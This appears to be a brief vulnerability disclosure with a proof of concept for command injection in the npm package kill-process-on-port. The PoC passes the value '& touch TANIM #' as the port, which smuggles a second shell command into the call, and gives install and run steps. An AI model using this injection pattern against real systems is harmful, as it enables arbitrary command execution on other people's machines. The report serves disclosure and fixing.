# Description

Command Injection in kill-process-on-port

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a = require("kill-process-on-port");
a.killProcessOnPort("& touch TANIM #");
```

2. Execute the following commands in terminal:

```
npm i kill-process-on-port # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
